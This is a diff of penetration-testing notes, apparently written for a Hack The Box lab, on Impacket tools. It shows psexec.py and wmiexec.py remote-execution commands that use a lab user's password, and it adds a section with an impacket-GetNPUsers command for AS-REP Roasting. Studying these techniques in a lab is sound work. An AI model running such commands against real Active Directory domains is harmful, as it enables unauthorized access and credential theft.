@@ -20,7 +20,7 @@ To connect to a host with psexec.py, we need credentials for a user with local a
 <pre class="language-shell-session"><code class="lang-shell-session"><strong>attacker@kali$ psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
 </strong></code></pre>
 
-<figure><img src="../../../../.gitbook/assets/Screenshot 2023-09-20 153517.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/Screenshot 2023-09-20 153517.png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -34,4 +34,17 @@ attacker@kali$ wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
 
 
 
-<figure><img src="../../../../.gitbook/assets/Screenshot 2023-09-20 160545.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/Screenshot 2023-09-20 160545.png" alt=""><figcaption></figcaption></figure>
+
+
+
+## GetUserNPs.py
+
+We can check for AS-REP Roasting with or without credentials depending on the configuration of the Domain Controller.
+
+```bash
+attacker@kali$ impacket-GetNPUsers -dc-ip htb.local -request 'htb.local/' 
+```
+
+<figure><img src="../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+
